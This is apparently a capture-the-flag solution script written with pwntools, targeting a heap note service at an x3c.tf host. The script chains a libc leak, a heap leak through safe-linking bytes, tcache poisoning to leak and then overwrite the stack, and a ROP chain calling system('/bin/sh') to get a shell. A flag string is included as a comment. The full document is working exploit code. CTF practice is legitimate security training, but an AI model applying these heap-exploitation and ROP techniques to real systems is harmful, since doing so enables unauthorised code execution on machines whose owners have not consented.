#! /usr/bin/python
from pwn import *
# log_level = "debug"
context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "ce8b1971-d1f7-4b44-bad9-22b79c5bf3ea.x3c.tf"
PORT = 31337

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT, ssl=True)
    else:
        return process(binary)

def create(p, index, size):
    sl(p, b"1")
    sla(p, b"index:", b"%i" % index)
    sla(p, b"size:", b"%i" % size)
    ru(p, b">")

def edit(p, index, value):
    sl(p,b"4")
    sla(p, b"index:", "%i" % index)
    sla(p, b"in:", value)
    ru(p,b">")

def delete(p, index):
    sl(p,b"2")
    sla(p, b"index:", "%i" % index)
    ru(p, b">")

def view(p, index):
    sl(p,b"3")
    sla(p, b"index:", "%i" % index)
    
    ru(p,b"buddy: ")
    ret = ru(p, b"1.")
    ru(p, b">")
    
    return ret[:-2]

def exploit(io,e, l):
    create(io, 0, 0x430) 
    create(io, 1, 0x18)
    delete(io, 0)

    create(io, 2, 0x430)
    delete(io, 0)
    leak = view(io, 2)
    leak = int.from_bytes(leak, "little")
    libc = leak - l.sym["main_arena"] - 96

    print(f"===== Libc: {hex(libc)}")

    # tcache poisoning time
    create(io, 3, 24)
    create(io, 4, 24)
    
    delete(io, 1)
    delete(io, 3)

    leak = view(io, 1)
    mangle = int.from_bytes(leak, "little")
    heap = mangle << 12

    print(f"===== Mangle bytes: {hex(mangle)}")
    print(f"===== Heap leak: {hex(heap)}") 

    create(io, 5, 24)
    delete(io, 3)

    edit(io, 5, p64((l.sym["environ"] + libc) ^ mangle))

    create(io, 6, 24)
    create(io, 7, 24)

    leak = view(io, 7)
    stack = int.from_bytes(leak, "little")

    print(f"===== Stack leak: {hex(stack)}")

    create(io, 8, 0x68)
    create(io, 9, 0x68)

    delete(io, 8)
    delete(io, 9)

    create(io, 10, 0x68)
    delete(io, 9)

    edit(io, 10, p64((stack - 0x188) ^ mangle))
    create(io, 11, 0x68)
    create(io, 12, 0x68)

    # rop
    pop_rdi = 0x000000000002a3e5 + libc
    ret = 0x0000000000029139 + libc
    binsh = next(l.search(b"/bin/sh")) + libc

    payload = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(l.sym["system"] + libc)

    edit(io, 12, b"A" * 8 + p64(stack - 0x150) + p64(0xdeadbeef) * 3 + payload)

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc-2.35.so")

    exploit(p,e,l)

# MVM{pwnpope_is_mining_xmr_on_your_machine_for_the_vatican}

